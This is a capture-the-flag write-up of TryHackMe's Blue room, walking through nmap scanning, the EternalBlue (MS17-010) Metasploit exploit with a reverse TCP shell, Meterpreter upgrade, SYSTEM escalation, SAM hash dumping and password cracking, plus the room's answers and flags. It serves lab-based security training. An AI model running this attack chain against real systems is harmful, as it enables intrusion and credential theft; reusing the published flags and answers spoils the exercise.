---
title: "Blue — TryHackMe Cyber Security 101"
date: 2026-05-02
category: "writeup"
excerpt: "Walkthrough of TryHackMe's Blue room — Deploy & hack into a Windows machine, leveraging common misconfigurations issues."
image: "/images/blog/108.png"
readtime: "20 min read"
draft: false
---

## Tasks

- [Task 1 — Recon](#task-1)
- [Task 2 — Gain Access](#task-2)
- [Task 3 — Escalate](#task-3)
- [Task 4 — Cracking](#task-4)
- [Task 5 — Find Flags](#task-5)

---

## Task 1 — Recon {#task-1}

Blue. This is probably the most famous beginner room on TryHackMe and the reputation is deserved. It's not complicated but it teaches you the full loop: scan, exploit, escalate, crack. If you've been doing the Metasploit series leading up to this, you'll recognize most of what's happening here.

The machine is Windows and the first thing the room tells you is that it doesn't respond to ping. So if you run a basic nmap scan and get nothing back and start wondering if the machine even started, that's why. You need to tell nmap to skip the ping check with `-Pn` otherwise it'll just assume the host is down and not bother scanning.

```bash
nmap -Pn -sV -sC <target-ip>
```

Give it a minute. The machine takes a bit to boot up and nmap on a slow connection can feel like it's doing nothing for a while. It's doing something. Probably.

**How many ports are open with a port number under 1000?** `3`

**What is this machine vulnerable to?** `ms17-010`

This is EternalBlue. If you've heard of the WannaCry ransomware attack from 2017 that shut down hospitals and caused absolute chaos, this is the vulnerability that made it possible. It's a flaw in the Windows SMB protocol, specifically in how it handles certain requests. Microsoft patched it in March 2017 (hence ms17-010) but a huge number of machines never got that patch applied, and this Windows 7 box is one of them.

Nmap will actually tell you this if you use the right scripts. The `--script vuln` flag or specifically `--script smb-vuln-ms17-010` will come back and tell you straight up that the machine is vulnerable. You don't have to guess.

---

## Task 2 — Gain Access {#task-2}

Time to open Metasploit.

```bash
msfconsole
```

**What is the full path of the exploit?** `exploit/windows/smb/ms17_010_eternalblue`

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Run `show options` and you'll see what needs to be set.

**What is the name of the required value?** `RHOSTS`

That's just the target IP. Set it:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <target-ip>
```

Now before running it, the room asks you to manually set the payload to a specific one:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
```

By default EternalBlue would pick a payload on its own but the room wants you to be explicit about it. The payload here is a staged reverse TCP shell for 64-bit Windows. Staged means it'll send a small initial bit that then pulls down the rest of the payload. The connection goes from the target back to your machine, which is why it's called reverse.

Make sure you also have LHOST set to your AttackBox IP, then:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

If it works you'll eventually get a shell prompt. It might look like nothing is happening for a bit and then suddenly there's output. Press enter once if the DOS prompt doesn't appear immediately. Sometimes it just needs a nudge.

If it fails completely, the room says to try again before rebooting the target. EternalBlue can be a bit weird. I had to run it twice before it connected properly. Just try again before you assume something is wrong.

Once you have the shell, background it with CTRL+Z.

---

## Task 3 — Escalate {#task-3}

So you have a basic shell. The problem with a basic shell is that it's basic. No Meterpreter features, no migrate, no hashdump, none of the good stuff. The goal here is to upgrade it.

**What post module converts a shell to Meterpreter?** `post/multi/manage/shell_to_meterpreter`

```bash
msf6 > use post/multi/manage/shell_to_meterpreter
```

Run `show options` and you'll see it needs a SESSION value. That's the session number of the shell you just backgrounded. If you're not sure which number it is:

```bash
msf6 > sessions
```

That lists all your active sessions. Find the one from EternalBlue and note the ID.

**What option do we need to set?** `SESSION`

```bash
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run
```

It'll go off and do its thing. When it's done a new session will open with a Meterpreter shell. Switch to it:

```bash
msf6 > sessions -i 2
```

Now check privileges:

```bash
meterpreter > getsystem
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Good. We're SYSTEM. If you want to double check, drop into a shell and run whoami:

```bash
meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

That's as high as it goes on Windows. Background the shell again and get back to Meterpreter.

Now run `ps` to list all the processes. You're looking for one that's running as NT AUTHORITY\SYSTEM that you can migrate into. Something stable like `spoolsv.exe` or one of the `svchost.exe` processes. Write down the PID from the far left column.

```bash
meterpreter > migrate 1234
[*] Migrating from 2748 to 1234...
[*] Migration completed successfully.
```

Replace 1234 with whatever PID you picked. The room warns that migration is unstable and might fail, which is accurate. If it fails just try a different process. If it really won't work, reboot the target and start the exploit over. It's annoying but it happens.

Once you've migrated successfully you're in a more stable process and still running as SYSTEM.

---

## Task 4 — Cracking {#task-4}

Now for the fun part.

```bash
meterpreter > hashdump
```

This dumps the contents of the SAM database, which is where Windows keeps its password hashes.

**What is the name of the non-default user?** `jon`

You'll see three accounts come back: Administrator, Guest, and Jon. Administrator and Guest are there by default on every Windows install. Jon is the actual user someone set up on this machine.

The output looks like this:

```
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The bit after the third colon is the NTLM hash. Copy that.

To crack it just paste it straight into crackstation.net which is the fastest option for common passwords. It'll look it up in its database and if the password is anything commonly used it'll come back with the plaintext almost immediately.

**What is the cracked password?** `alqfna22`

Not the most obvious password but crackstation finds it without any trouble. That's what rainbow tables are for.

---

## Task 5 — Find Flags {#task-5}

Running `search -f flag*` returned all three locations at once, which made finding them way easier than manually digging through the filesystem.

**Flag 1?** `flag{access_the_machine}`

**Flag 2?** `flag{sam_database_elevated_access}`

**Flag 3?** `flag{admin_documents_can_be_valuable}`

---

That's Blue. It's a short room but it covers the whole loop cleanly. The EternalBlue exploit itself is kind of wild when you think about the history behind it. This is literally the same vulnerability that WannaCry used to spread across entire networks in 2017. Running it in a lab against a Windows 7 machine and watching a SYSTEM shell pop out makes that history feel a lot more real than just reading about it.

The migrate step is the one that'll bite you if you're not paying attention. Always check what user owns the process before you jump into it. And if everything falls apart just restart the machine and run the exploit again. It's not elegant but it works.

Next up is Ice, which is the sequel to this room.

On to the next one.

---